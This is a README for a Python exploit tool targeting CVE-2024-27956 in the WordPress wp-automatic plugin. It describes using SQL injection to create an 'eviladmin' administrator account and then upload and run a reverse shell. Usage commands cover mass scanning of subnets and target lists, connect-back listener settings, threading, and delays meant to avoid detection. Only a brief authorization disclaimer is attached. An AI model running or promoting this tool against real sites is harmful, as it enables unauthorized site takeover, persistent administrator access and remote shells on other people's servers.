## WordPress Admin Account Creation and Reverse Shell (cve-2024-27956)

This Python script automates the process of creating a new administrator account in a WordPress site and executing a reverse shell on the target server. It utilizes the wp-automatic plugin's CSV injection vulnerability to execute SQL queries on the WordPress database and gain administrative access.
 

## update ü¶π‚Äç‚ôÄÔ∏è

### Nuclei template added
### add some more methods for supporting massive attack targets 
### add multiple targets support
### add Auto find target by scanners base ip or txt file 

## How to use 

- Here are some more advanced examples of how you might use the script, assuming you have the proper authorization to test the target systems.

1. **Scanning a subnet**: If you want to scan a subnet for vulnerable WordPress installations, you can use the `--subnet` option. For example:
   ```
   python wp-automatic-exploit.py --subnet 192.168.1.0/24 --lhost 127.0.0.1 --lport 1414 --threads 10 --delay 1.0
   ```
   This command will scan the `192.168.1.0/24` subnet for WordPress sites with the vulnerable WP Automatic plugin, and attempt to exploit them using the provided listener settings.

2. **Customizing the delay**: The delay between requests can be adjusted using the `--delay` option. A higher delay may help avoid detection or rate limiting, while a lower delay can speed up the exploitation process. For example:
   ```
   python wp-automatic-exploit.py --targets targets.txt --lhost 127.0.0.1 --lport 1414 --threads 10 --delay 2.5
   ```
   This command will use a delay of 2.5 seconds between requests.

3. **Using a remote listener**: If your listener is set up on a remote machine, you can specify its IP address and port using the `--lhost` and `--lport` options. For example:
   ```
   python wp-automatic-exploit.py --targets targets.txt --lhost 192.168.1.100 --lport 8080 --threads 10 --delay 1.0
   ```
   This command will connect back to a listener on `192.168.1.100:8080`.

4. **Increasing the number of threads**: You can increase the number of threads used by the script with the `--threads` option. This can speed up the exploitation process, but may also increase the likelihood of detection or cause issues with rate limiting. For example:
   ```
   python wp-automatic-exploit.py --targets targets.txt --lhost 127.0.0.1 --lport 1414 --threads 20 --delay 1.0
   ```
   This command will use 20 threads for exploitation.


## Prerequisites

- Python 3.x
- `requests` library (install via `pip install requests`)
- Netcat (for setting up a listener to connect to the reverse shell)

## Usage

1. Replace the `domain` variable in the script with the URL of the target WordPress site.
2. Run the Python script.
3. Once the script is executed, it will create a new admin user named `eviladmin`, set the password, and assign administrative privileges.
4. It will then upload and execute a reverse shell payload on the target server.
5. Set up a netcat listener to connect to the reverse shell using the specified port.

**Note:** Ensure that you have proper authorization and permissions before running this script, as it can lead to security vulnerabilities and legal consequences if misused.
